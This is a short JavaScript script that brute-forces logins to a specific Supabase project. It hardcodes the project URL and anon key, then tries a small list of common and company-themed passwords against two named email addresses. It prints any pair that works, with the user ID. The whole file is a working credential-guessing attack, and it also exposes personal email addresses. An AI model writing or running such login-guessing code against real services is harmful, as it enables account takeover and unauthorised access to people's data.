import { createClient } from '@supabase/supabase-js';

var c = createClient(
  'https://pnnuqwdcgoympgddrvze.supabase.co',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBubnVxd2RjZ295bXBnZGRydnplIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA2MjgxNDgsImV4cCI6MjA4NjIwNDE0OH0.ovuhuCAdK3guWchqKDWK7MA-qv8cmhO0xdrGuv7M7fY'
);

var passwords = ['Welkom123!', 'Test1234!', 'test123456', 'Password123!', 'Trifinity123!'];
var emails = ['janpaul@gmail.com', 'jan@tfrst.nl'];

var found = false;
for (var i = 0; i < emails.length; i++) {
  for (var j = 0; j < passwords.length; j++) {
    var r = await c.auth.signInWithPassword({ email: emails[i], password: passwords[j] });
    if (r.data?.session) {
      console.log('SUCCESS:', emails[i], '/', passwords[j]);
      console.log('User ID:', r.data.user.id);
      found = true;
      break;
    }
  }
  if (found) break;
}
if (!found) console.log('No valid credentials found');
